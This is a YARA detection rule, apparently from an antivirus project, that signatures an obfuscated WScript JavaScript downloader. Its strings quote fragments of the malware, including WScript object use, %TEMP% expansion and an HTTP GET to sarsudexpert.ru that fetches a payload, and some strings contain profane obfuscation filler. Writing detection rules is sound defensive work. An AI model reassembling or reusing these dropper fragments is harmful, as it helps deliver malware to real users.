rule sig_20160428_f1f33e010b6c9a8d67776e6b727b3e5e {
  meta:
    description = "datamaliciousorder - file 20160428_f1f33e010b6c9a8d67776e6b727b3e5e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "60ea885088c7b7bd44b2120e7ed667cd220eea162a37206fa7167d133d819468"

  strings:
    $s1  = "function DclRqkTuaChpEwjEveWog(NdpPmuDltLnlQzxYnxVrl){UzdEffBqfDugKlkNpoCcl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function PpxQasUziGqdFxwAgcMqe() {return UzdEffBqfDugKlkNpoCcl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function DclRqkTuaChpEwjEveWog(NdpPmuDltLnlQzxYnxVrl){UzdEffBqfDugKlkNpoCcl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function VpdYfdDzrFdgFytOinVts(FbxFkoKypKyeZjmMssQha, OhxMhyYtfKhjMwkWqiJxt){NzwGdxOcsLdjZreZxpMhr = NzwGdxOcsLdjZreZxpMhr * 1; " ascii
    $s5  = "return FbxFkoKypKyeZjmMssQha - OhxMhyYtfKhjMwkWqiJxt;};" fullword ascii
    $s6  = "var UzdEffBqfDugKlkNpoCcl = function OzmPcbImbXbzXkkHrcBac() {return GogQphFiwAxjVgaGzaMov[GavItuWgzAebHsmDqyEui](\"WScript\"+\"" ascii
    $s7  = "NaqJzlHkpEuuGimFizPis[MplZbpFlaSckXcmEpvTsc](\"G\" + \"ET\", \"http://sarsudexpert.ru/q2ikcxz\", false);" fullword ascii
    $s8  = "var UzdEffBqfDugKlkNpoCcl = function OzmPcbImbXbzXkkHrcBac() {return GogQphFiwAxjVgaGzaMov[GavItuWgzAebHsmDqyEui](\"WScript\"+\"" ascii
    $s9  = "var GogQphFiwAxjVgaGzaMov = this[\"WScript\"];" fullword ascii
    $s10 = "return VpdYfdDzrFdgFytOinVts(1 == 1 ? TvzSmpVkdKxtDdlLvsCtz : 0, 1 == 1 ? LakJxaEoeRyuUekZozLse : 0);" fullword ascii
    $s11 = "function PpxQasUziGqdFxwAgcMqe() {return UzdEffBqfDugKlkNpoCcl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s12 = "if (NaqJzlHkpEuuGimFizPis[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function JnwGeqPwxGkaXduSdnKfs(){return EkgFbcHyfMleUwjAonUyl + \"\";};" fullword ascii
    $s14 = "function VpdYfdDzrFdgFytOinVts(FbxFkoKypKyeZjmMssQha, OhxMhyYtfKhjMwkWqiJxt){NzwGdxOcsLdjZreZxpMhr = NzwGdxOcsLdjZreZxpMhr * 1; " ascii
    $s15 = "function WisPhhLytFgdOcuGclVku() {return ((JkvAlvYrtWcrGpeVvhEbb == true) && (JkvAlvYrtWcrGpeVvhEbb == IedFgvWpvOhrNljKfzOpq)) ?" ascii
    $s16 = "function WisPhhLytFgdOcuGclVku() {return ((JkvAlvYrtWcrGpeVvhEbb == true) && (JkvAlvYrtWcrGpeVvhEbb == IedFgvWpvOhrNljKfzOpq)) ?" ascii
    $s17 = "var NzsMdcLxeSzfChwNraQre = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "function SmgBudLhyMmiMunDhuWfu()" fullword ascii
    $s19 = "function CpbWusJhhErsBnfYhpAfl(EjcHevSspIjyYjxSupFzg) {var KnrRkuAppFwdXxjZbsRfg = (1, 2, 3, 4, 5, EjcHevSspIjyYjxSupFzg); retur" ascii
    $s20 = "GbbAbmPnoPrhSwcJrbFoz = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}